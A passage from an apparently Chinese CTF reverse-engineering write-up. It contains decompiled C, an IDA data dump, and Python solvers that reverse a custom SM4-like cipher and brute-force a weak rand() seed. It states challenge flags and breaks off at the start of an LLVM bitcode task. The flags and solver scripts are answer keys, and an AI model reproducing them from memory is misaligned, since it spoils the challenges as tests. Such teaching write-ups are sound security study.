class="number">121</span>, -<span class="number">18</span>, <span class="number">95</span>, <span class="number">62</span>, -<span class="number">41</span>, -<span class="number">53</span>, <span class="number">57</span>, <span class="number">72</span></span><br><span class="line">]</span><br><span class="line">SBOX = [b &amp; <span class="number">0xFF</span> <span class="keyword">for</span> b <span class="keyword">in</span> SBOX_RAW]</span><br><span class="line"></span><br><span class="line">FK = [<span class="number">0xa3b1bac6</span>, <span class="number">0x56aa3350</span>, <span class="number">0x677d9197</span>, <span class="number">0xb27022dc</span>]</span><br><span class="line">CK = [</span><br><span class="line">    <span class="number">0x00070e15</span>, <span class="number">0x1c232a31</span>, <span class="number">0x383f464d</span>, <span class="number">0x545b6269</span>, <span class="number">0x70777e85</span>, <span class="number">0x8c939aa1</span>, <span class="number">0xa8afb6bd</span>, <span class="number">0xc4cbd2d9</span>,</span><br><span class="line">    <span class="number">0xe0e7eef5</span>, <span class="number">0xfc030a11</span>, <span class="number">0x181f262d</span>, <span class="number">0x343b4249</span>, <span class="number">0x50575e65</span>, <span class="number">0x6c737a81</span>, <span class="number">0x888f969d</span>, <span class="number">0xa4abb2b9</span>,</span><br><span class="line">    <span class="number">0xc0c7ced5</span>, <span class="number">0xdce3eaf1</span>, <span class="number">0xf8ff060d</span>, <span class="number">0x141b2229</span>, <span class="number">0x30373e45</span>, <span class="number">0x4c535a61</span>, <span class="number">0x686f767d</span>, <span class="number">0x848b9299</span>,</span><br><span class="line">    <span class="number">0xa0a7aeb5</span>, <span class="number">0xbcc3cad1</span>, <span class="number">0xd8dfe6ed</span>, <span class="number">0xf4fb0209</span>, <span class="number">0x10171e25</span>, <span class="number">0x2c333a41</span>, <span class="number">0x484f565d</span>, <span class="number">0x646b7279</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotl</span>(<span class="params">x, n</span>):</span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; n) &amp; <span class="number">0xffffffff</span>) | (x &gt;&gt; (<span class="number">32</span> - n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotl8</span>(<span class="params">x, n</span>):</span><br><span class="line">    n &amp;= <span class="number">0x7</span></span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; n) &amp; <span class="number">0xFF</span>) | (x &gt;&gt; (<span class="number">8</span> - n))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 初始化自定义 S 盒逻辑</span></span><br><span class="line">SBOX_P = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    i = (b ^ <span class="number">0xA7</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    j = SBOX[i]</span><br><span class="line">    k = b &amp; <span class="number">0x3</span></span><br><span class="line">    SBOX_P[b] = rotl8(j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sbox_transform</span>(<span class="params">val</span>):</span><br><span class="line">    <span class="keyword">return</span> SBOX_P[(val ^ <span class="number">0x3C</span>) &amp; <span class="number">0xFF</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tau</span>(<span class="params">paramInt</span>):</span><br><span class="line">    i = sbox_transform((paramInt &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line">    j = sbox_transform((paramInt &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line">    k = sbox_transform((paramInt &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line">    m = sbox_transform(paramInt &amp; <span class="number">0xFF</span>)</span><br><span class="line">    <span class="keyword">return</span> (i &lt;&lt; <span class="number">24</span>) | (j &lt;&lt; <span class="number">16</span>) | (k &lt;&lt; <span class="number">8</span>) | m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T</span>(<span class="params">n</span>):</span><br><span class="line">    i = tau(n)</span><br><span class="line">    <span class="keyword">return</span> i ^ rotl(i, <span class="number">2</span>) ^ rotl(i, <span class="number">10</span>) ^ rotl(i, <span class="number">18</span>) ^ rotl(i, <span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">TPrime</span>(<span class="params">n</span>):</span><br><span class="line">    i = tau(n)</span><br><span class="line">    <span class="keyword">return</span> i ^ rotl(i, <span class="number">13</span>) ^ rotl(i, <span class="number">23</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 密钥扩展</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">expand_key</span>(<span class="params">seed_str</span>):</span><br><span class="line">    seed_bytes = seed_str.encode()</span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        i = seed_bytes[b % <span class="built_in">len</span>(seed_bytes)] &amp; <span class="number">0xFF</span></span><br><span class="line">        j = (i + b * <span class="number">17</span> + <span class="number">35</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        key.append(j)</span><br><span class="line">    </span><br><span class="line">    MK = [struct.unpack(<span class="string">&quot;&gt;I&quot;</span>, <span class="built_in">bytes</span>(key[i:i+<span class="number">4</span>]))[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>)]</span><br><span class="line">    K = [MK[i] ^ FK[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    rk = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        tmp = K[i+<span class="number">1</span>] ^ K[i+<span class="number">2</span>] ^ K[i+<span class="number">3</span>] ^ CK[i]</span><br><span class="line">        K_new = K[i] ^ TPrime(tmp)</span><br><span class="line">        K.append(K_new)</span><br><span class="line">        rk.append(K_new)</span><br><span class="line">    <span class="keyword">return</span> rk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 解密单块</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_block</span>(<span class="params">cipher_block, rk</span>):</span><br><span class="line">    X = <span class="built_in">list</span>(struct.unpack(<span class="string">&quot;&gt;4I&quot;</span>, cipher_block))</span><br><span class="line">    <span class="comment"># 注意：Java 代码加密结束时做了反序(35, 34, 33, 32)，</span></span><br><span class="line">    <span class="comment"># 所以解密开始时输入就是反序的，迭代后再反序回来</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        tmp = X[i+<span class="number">1</span>] ^ X[i+<span class="number">2</span>] ^ X[i+<span class="number">3</span>] ^ rk[<span class="number">31</span>-i]</span><br><span class="line">        X.append(X[i] ^ T(tmp))</span><br><span class="line">    </span><br><span class="line">    res = struct.pack(<span class="string">&quot;&gt;4I&quot;</span>, X[<span class="number">35</span>], X[<span class="number">34</span>], X[<span class="number">33</span>], X[<span class="number">32</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">target_hex = <span class="string">&quot;21c2692a4775c413356a31fc55c38f6218bed9d46c45bd0eb777be9334c999d7&quot;</span></span><br><span class="line">cipher_bytes = <span class="built_in">bytes</span>.fromhex(target_hex)</span><br><span class="line">round_keys = expand_key(<span class="string">&quot;happ&quot;</span>)</span><br><span class="line"></span><br><span class="line">plain_bytes = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher_bytes), <span class="number">16</span>):</span><br><span class="line">    plain_bytes += decrypt_block(cipher_bytes[i:i+<span class="number">16</span>], round_keys)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 移除 PKCS7 Padding</span></span><br><span class="line">pad_len = plain_bytes[-<span class="number">1</span>]</span><br><span class="line">flag = plain_bytes[:-pad_len].decode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;解密后的结果: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>flag{Have_A_Nice_Dayyyy}</strong></p>
<ul>
<li>ezc</li>
</ul>
<blockquote>
<p>What about the random key?</p>
<p>flag提交格式：flag{youget}<br>flag Submission format: flag{youget}</p>
</blockquote>
<p>ida直接打开</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">__pid_t</span> pid; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">void</span> *v7; <span class="comment">// rsp</span></span><br><span class="line">  _QWORD s1_1[<span class="number">7</span>]; <span class="comment">// [rsp+8h] [rbp-4A0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 j; <span class="comment">// [rsp+40h] [rbp-468h]</span></span><br><span class="line">  <span class="type">size_t</span> n36; <span class="comment">// [rsp+48h] [rbp-460h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+50h] [rbp-458h]</span></span><br><span class="line">  __int64 n35; <span class="comment">// [rsp+58h] [rbp-450h]</span></span><br><span class="line">  _QWORD *s1_2; <span class="comment">// [rsp+60h] [rbp-448h]</span></span><br><span class="line">  __int64 n35_1; <span class="comment">// [rsp+68h] [rbp-440h]</span></span><br><span class="line">  <span class="type">void</span> *s1; <span class="comment">// [rsp+70h] [rbp-438h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">1032</span>]; <span class="comment">// [rsp+78h] [rbp-430h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v17; <span class="comment">// [rsp+480h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  v17 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v3 = time(<span class="number">0</span>);</span><br><span class="line">  pid = getpid();</span><br><span class="line">  srand((pid ^ v3) % <span class="number">0x14</span>);</span><br><span class="line">  n35 = <span class="number">35</span>;</span><br><span class="line">  s1_1[<span class="number">4</span>] = <span class="number">36</span>;</span><br><span class="line">  s1_1[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">  s1_1[<span class="number">2</span>] = <span class="number">36</span>;</span><br><span class="line">  s1_1[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">  v5 = alloca(<span class="number">48</span>);</span><br><span class="line">  s1_2 = s1_1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x24</span>; ++i )</span><br><span class="line">    *((_BYTE *)s1_2 + i) = rand();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your guess (exactly %zu bytes): &quot;</span>, <span class="number">0x24u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fgets(s, <span class="number">1024</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    n36 = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">if</span> ( n36 &amp;&amp; s[n36 - <span class="number">1</span>] == <span class="number">10</span> )</span><br><span class="line">      s[--n36] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( n36 == <span class="number">36</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      n35_1 = <span class="number">35</span>;</span><br><span class="line">      s1_1[<span class="number">0</span>] = <span class="number">36</span>;</span><br><span class="line">      s1_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">      v7 = alloca(<span class="number">48</span>);</span><br><span class="line">      s1 = s1_1;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">0x24</span>; ++j )</span><br><span class="line">        *((_BYTE *)s1 + j) = *((_BYTE *)s1_2 + j) ^ s[j];</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(s1, &amp;cipher, <span class="number">0x24u</span>) )</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Correct! Your input is the plaintext.&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Incorrect.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Wrong length: expected %zu, got %zu\n&quot;</span>, <span class="number">0x24u</span>, n36);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;No input\n&quot;</span>, <span class="number">1u</span>, <span class="number">9u</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>显然密文是cipher</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000002020 1F                                cipher db  1Fh                          ; DATA XREF: main+386↑o</span><br><span class="line">.rodata:0000000000002021 C9                                db 0C9h</span><br><span class="line">.rodata:0000000000002022 ED                                db 0EDh</span><br><span class="line">.rodata:0000000000002023 29                                db  29h ; )</span><br><span class="line">.rodata:0000000000002024 A6                                db 0A6h</span><br><span class="line">.rodata:0000000000002025 FE                                db 0FEh</span><br><span class="line">.rodata:0000000000002026 44                                db  44h ; D</span><br><span class="line">.rodata:0000000000002027 EE                                db 0EEh</span><br><span class="line">.rodata:0000000000002028 82                                db  82h</span><br><span class="line">.rodata:0000000000002029 45                                db  45h ; E</span><br><span class="line">.rodata:000000000000202A E9                                db 0E9h</span><br><span class="line">.rodata:000000000000202B D8                                db 0D8h</span><br><span class="line">.rodata:000000000000202C 7F                                db  7Fh ; </span><br><span class="line">.rodata:000000000000202D 42                                db  42h ; B</span><br><span class="line">.rodata:000000000000202E 10                                db  10h</span><br><span class="line">.rodata:000000000000202F E0                                db 0E0h</span><br><span class="line">.rodata:0000000000002030 BB                                db 0BBh</span><br><span class="line">.rodata:0000000000002031 4B                                db  4Bh ; K</span><br><span class="line">.rodata:0000000000002032 D0                                db 0D0h</span><br><span class="line">.rodata:0000000000002033 05                                db    5</span><br><span class="line">.rodata:0000000000002034 4C                                db  4Ch ; L</span><br><span class="line">.rodata:0000000000002035 76                                db  76h ; v</span><br><span class="line">.rodata:0000000000002036 90                                db  90h</span><br><span class="line">.rodata:0000000000002037 CB                                db 0CBh</span><br><span class="line">.rodata:0000000000002038 48                                db  48h ; H</span><br><span class="line">.rodata:0000000000002039 9C                                db  9Ch</span><br><span class="line">.rodata:000000000000203A 7A                                db  7Ah ; z</span><br><span class="line">.rodata:000000000000203B A9                                db 0A9h</span><br><span class="line">.rodata:000000000000203C F0                                db 0F0h</span><br><span class="line">.rodata:000000000000203D 33                                db  33h ; 3</span><br><span class="line">.rodata:000000000000203E 55                                db  55h ; U</span><br><span class="line">.rodata:000000000000203F 25                                db  25h ; %</span><br><span class="line">.rodata:0000000000002040 64                                db  64h ; d</span><br><span class="line">.rodata:0000000000002041 88                                db  88h</span><br><span class="line">.rodata:0000000000002042 3D                                db  3Dh ; =</span><br><span class="line">.rodata:0000000000002043 F7                                db 0F7h</span><br><span class="line">.rodata:0000000000002044 00                                db    0</span><br><span class="line">.rodata:0000000000002045 00                                db    0</span><br><span class="line">.rodata:0000000000002046 00                                db    0</span><br><span class="line">.rodata:0000000000002047 00                                db    0</span><br></pre></td></tr></table></figure>
<p>生成随机密钥，但是种子可以爆破</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">srand((pid ^ time(<span class="number">0</span>)) % <span class="number">0x14</span>);  <span class="comment">// 种子取值范围 0-19</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0x24</span>; ++i)</span><br><span class="line">    key[i] = rand();</span><br></pre></td></tr></table></figure>
<p>用户输入</p>
<p>程序要求输入 36 字节</p>
<p>读取用户输入 s，去除换行符</p>
<p>异或加密</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">0x24</span>; ++j)</span><br><span class="line">    buffer[j] = key[j] ^ s[j];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">memcmp</span>(buffer, &amp;cipher, <span class="number">0x24u</span>))</span><br><span class="line">    <span class="comment">// 正确</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">cipher = <span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0x1F</span>, <span class="number">0xC9</span>, <span class="number">0xED</span>, <span class="number">0x29</span>, <span class="number">0xA6</span>, <span class="number">0xFE</span>, <span class="number">0x44</span>, <span class="number">0xEE</span>,</span><br><span class="line">    <span class="number">0x82</span>, <span class="number">0x45</span>, <span class="number">0xE9</span>, <span class="number">0xD8</span>, <span class="number">0x7F</span>, <span class="number">0x42</span>, <span class="number">0x10</span>, <span class="number">0xE0</span>,</span><br><span class="line">    <span class="number">0xBB</span>, <span class="number">0x4B</span>, <span class="number">0xD0</span>, <span class="number">0x05</span>, <span class="number">0x4C</span>, <span class="number">0x76</span>, <span class="number">0x90</span>, <span class="number">0xCB</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x9C</span>, <span class="number">0x7A</span>, <span class="number">0xA9</span>, <span class="number">0xF0</span>, <span class="number">0x33</span>, <span class="number">0x55</span>, <span class="number">0x25</span>,</span><br><span class="line">    <span class="number">0x64</span>, <span class="number">0x88</span>, <span class="number">0x3D</span>, <span class="number">0xF7</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;直接尝试所有20种种子:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> seed <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    libc.srand(seed)</span><br><span class="line">    key = <span class="built_in">bytes</span>([libc.rand() &amp; <span class="number">0xFF</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>)])</span><br><span class="line">    plain = <span class="built_in">bytes</span>([key[i] ^ cipher[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>)])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        plain_str = plain.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;种子 <span class="subst">&#123;seed:2d&#125;</span>: <span class="subst">&#123;plain_str&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="comment"># 如果不是纯ASCII，显示hex</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;种子 <span class="subst">&#123;seed:2d&#125;</span>: <span class="subst">&#123;plain.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">python3 1.py</span><br><span class="line">直接尝试所有20种种子:</span><br><span class="line">种子  0: 780f845af7010e02ab8853738db9f3a6c78984fd579e77463ec654cac3ac9cbf02ba3040</span><br><span class="line">种子  1: 780f845af7010e02ab8853738db9f3a6c78984fd579e77463ec654cac3ac9cbf02ba3040</span><br><span class="line">种子  2: e5b6a966732c44c3ab0e7f1b32876dc9c59e8fdf7e6249509f0300a708a478d772fa7c1b</span><br><span class="line">种子  3: 25183501f7828c5e83b5235c7e492ae9d3e4c1226f404e91d93bd7c044ad2bcb14de2b36</span><br><span class="line">种子  4: c2faaf3755e7ddf5a63ca9aac54e7b4ecd26391029eaf0fc0d22185390975b18bcd8663c</span><br><span class="line">种子  5: 04148721ca0e747743688bd87bdc0a04a791f46b825b5f7e2bf035d0e41c370a68440a8e</span><br><span class="line">种子  6: a270f5180a8bb2ed081766739a371238bbc7a73df3e87c1565cfa69d052c0297bce7d972</span><br><span class="line">种子  7: ea8ad686cbe53e7fd27c9a319ca4b95849c9a2653475ec2385507bd9315d1893d6005be8</span><br><span class="line">种子  8: 6751cf54f1339a3b3bc41ead1b456f166fdd11101d58f9759cbb4ce0a7e0c4f5083b7034</span><br><span class="line">种子  9: 1cbb487ed463a8084861515bfd13852f0a9f6e3e0136dbfe8f768ea6ed2e1505eb6d4af5</span><br><span class="line">种子 10: 7051cb1ca437c73909861e6d5fcf586d7b7d27b9584e3b9e2a908252684528226b2c01e6</span><br><span class="line">种子 11: a05f98248d99adf78b769dc4f94c6129827f97b737aea5ee7f479e0b07568f939fc7f9d0</span><br><span class="line">种子 12: cf5b5fe99d09c177033d33651a5c68882088ff1932b6cc19ee74816b6ade894f1b07174c</span><br><span class="line">种子 13: b5b452a6da0674e54bd6bf73e92443bb4e4b6037a13f5111a944cf979b725630da4b98cc</span><br><span class="line">种子 14: 044dfa73a74ad3c6554f9b781f4cb4b127a959e07c6beb6de4fa7afdebe045133cafadae</span><br><span class="line">种子 15: caafd0aef6eff6be9dd542e81fae72213608540421eee50a482d7218c8479028be8aa9dd</span><br><span class="line">种子 16: c4deea31-5d10-4b6c-8c45-6afac715eea3</span><br><span class="line">种子 17: a664922a39f1b589fbf2d005eccabe0a0b76aa02beff75ff6bc9a2e747e9b954ece449d0</span><br><span class="line">种子 18: 49d7a2f6a2d0836666182b75c558fa4fc141bd96c821cb40b02b01546e9341d0dbece934</span><br><span class="line">种子 19: 06b1d5236189cdaf5eb148785ebc3999bd288f196362df19fa1fd803a1dd264e022348d9</span><br></pre></td></tr></table></figure>
<p>注意：不要在Windows环境运行脚本，否则报错。</p>
<p>很明显flag是<strong>flag{c4deea31-5d10-4b6c-8c45-6afac715eea3}</strong></p>
<ul>
<li>abc</li>
</ul>
<blockquote>
<p>bc What is the file</p>
</blockquote>
<p><code>.bc</code> 文件是LLVM位码文件，LLVM（低级虚拟机）的中间表示（IR），一种与平台无关的二进制中间代码格式</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install llvm</span><br><span class="line">llvm-dis a.bc -o a.ll</span><br></pre></td></tr></table></figure>
<p>用llvm反编译为llvm-IR代码，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span 